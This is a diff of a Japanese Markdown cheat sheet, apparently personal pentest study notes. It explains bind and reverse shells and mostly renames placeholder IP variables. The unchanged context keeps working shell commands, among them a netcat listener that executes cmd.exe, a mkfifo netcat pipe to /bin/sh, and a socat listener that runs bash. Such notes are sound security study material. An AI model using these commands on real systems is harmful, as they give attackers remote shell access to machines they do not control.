@@ -34,8 +34,9 @@
 ## Bind Shellとは
 
 ターゲットマシン上でポートをオープンし、攻撃者のマシンからターゲットに通信を確立させる方法。
+攻撃者からターゲットに通信接続を試行するので、FWにより遮断されやすい。
 
-ターゲットがWindowsの例：
+以下はターゲットがWindowsの例。
 
 1. ターゲット上でリスナーを立てる
 ```cmd
@@ -44,10 +45,11 @@ nc -lvnp <Port> -e "cmd.exe"
 
 2. 攻撃者からターゲットマシンで開いたポートに接続
 ```zsh
-nc <TargetIP> <Port>
+nc <target_IP> <Port>
 ```
 ![[Pasted image 20230318180927.png | 900]]
 $$左が攻撃側、右がターゲット側$$
+
 ## Reverse Shellとは
 
 - 攻撃者のマシン上でポートをオープンし、ターゲットのマシンから攻撃者に通信を確立させる方法（Bind Shellとは逆）
@@ -88,7 +90,7 @@ mkfifo /tmp/f; nc -lvnp <Port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 
 2. 攻撃者のマシンからターゲットマシンに接続する
 ```zsh
-nc <TargetIP> <Port>
+nc <target_IP> <Port>
 ```
 
 ### Reverse Shell for Linux
@@ -153,7 +155,7 @@ nc -lvnp <Port> -e "cmd.exe"
 ```
 2. 攻撃者のマシン上で
 ```zsh
-nc <TargetIP> <Port>
+nc <target_IP> <Port>
 ```
 
 ### Reverse Shell for Windows
@@ -349,13 +351,13 @@ chcp 65001
 
 ```zsh
 # Bind Shell
-nc <TargetIP> <Port>
+nc <target_IP> <Port>
 
 # Reverse Shell
 nc -lvnp <Port>
 
 # banner grabbing
-nc -nv <TargetIP> <port>
+nc -nv <target_IP> <port>
 ```
 
 ---
@@ -427,7 +429,7 @@ socat TCP-L:<Port> EXEC: "bash -li"
 
 2. 攻撃側のマシンから接続(Linux/windows)
 ```zsh
-socat TCP:<TargetIP>:<Port> -
+socat TCP:<target_IP>:<Port> -
 ```
 
 ---
